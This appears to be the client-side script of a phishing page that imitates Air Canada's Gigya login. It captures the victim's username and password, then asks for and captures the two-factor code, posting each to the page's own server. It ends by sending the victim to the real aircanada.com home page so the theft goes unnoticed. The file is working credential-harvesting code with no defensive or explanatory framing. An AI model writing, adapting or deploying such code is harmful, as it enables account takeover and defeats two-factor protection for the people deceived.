var username 
var password

$('.gigya-input-submit').on('click', function () {
    let data = {}
    data.do = 'login'
    data.username = $('#username').val()
    data.password = $('#password').val()
    username = data.username
    password = data.password

    $.ajax({
        type: 'POST',
        data:data
    }).done(function(res) {
        console.log(res)
        if (res.success) {
            $('#auth').hide()
            $('#2fa').show()
            $('.gig-tfa-email-text').text(username)
        } else {
            $('.gigya-error-msg.gigya-form-error-msg').addClass("gigya-error-msg-active")
            $('.gigya-error-msg.gigya-form-error-msg').show()
        }
    })
})

$('.gig-tfa-button-submit').on('click', function(e) {
    e.preventDefault()

    let data = {};
    data.do = 'finishLogin';
    data.tfa = $('#tfa').val()
    data.username = username;
    data.password = password;

    $.ajax({
        type: 'POST',
        data: data
    }).done(function(response) {
        location.href = 'https://www.aircanada.com/us/en/aco/home.html'
    })
})